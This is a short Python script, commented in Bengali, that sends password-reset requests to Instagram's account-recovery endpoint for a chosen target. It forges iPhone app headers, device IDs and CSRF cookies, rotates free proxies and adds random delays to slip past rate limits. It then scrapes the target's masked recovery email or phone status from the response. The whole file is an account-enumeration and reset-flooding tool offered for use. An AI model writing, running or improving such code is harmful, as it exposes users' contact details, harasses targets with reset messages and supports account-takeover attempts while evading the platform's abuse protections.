import httpx
import re
import random
import uuid
import time

IOS_VERSIONS = ["16.1", "16.6", "17.0", "17.4", "17.5"]
DEVICES = [
    ("iPhone14,2", "iPhone 13 Pro"), ("iPhone15,2", "iPhone 14 Pro"),
    ("iPhone16,1", "iPhone 15 Pro"), ("iPhone16,2", "iPhone 15 Pro Max")
]

# 🚨 এখানে ফ্রি প্রক্সি বসাতে হবে
# আপনি গুগলে "Free Proxy List" সার্চ করে এখানে বসাতে পারেন
PROXIES = [
    None,  # প্রথমে ডিরেক্ট কানেকশন ট্রাই করবে
    # "http://188.12.34.56:8080",  <-- এখানে IP:PORT ফরম্যাটে প্রক্সি দিন
]

def get_headers():
    ios = random.choice(IOS_VERSIONS)
    dev_id, dev_name = random.choice(DEVICES)
    csrf = str(uuid.uuid4())
    
    ua = f"Instagram 312.0.0.34.114 (iPhone; iOS {ios}; en_US; {dev_name}; {dev_id})"
    
    return {
        "User-Agent": ua,
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "1",
        "x-requested-with": "XMLHttpRequest",
        "x-csrftoken": csrf,
        "x-device-id": ''.join(random.choices('0123456789abcdef', k=16)),
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "Cookie": f"csrftoken={csrf}; ig_did={str(uuid.uuid4()).upper()};"
    }

URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"

def send_reset(target):
    time.sleep(random.uniform(2.0, 4.0))
    
    # প্রক্সি সিলেক্ট করা হচ্ছে
    proxy = random.choice(PROXIES)
    mounts = {"http://": proxy, "https://": proxy} if proxy else None
    
    payload = {"email_or_username": target, "flow": "fxcal"}

    try:
        with httpx.Client(http2=True, headers=get_headers(), proxies=mounts, timeout=30.0) as client:
            o = client.post(URL, data=payload)
            c = o.text.lower()
            
            if o.status_code == 429 or "rate limit" in c:
                return "error:rate_limited"
            
            ev = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', c)
            if ev: return f"email:{ev.group(0)}"
                
            if "fail" in c or "no user found" in c: return "error:not_found"
                
            return "phone"
            
    except httpx.ProxyError:
        return "error:proxy_dead"
    except Exception as e:
        return f"error:{type(e).__name__}"
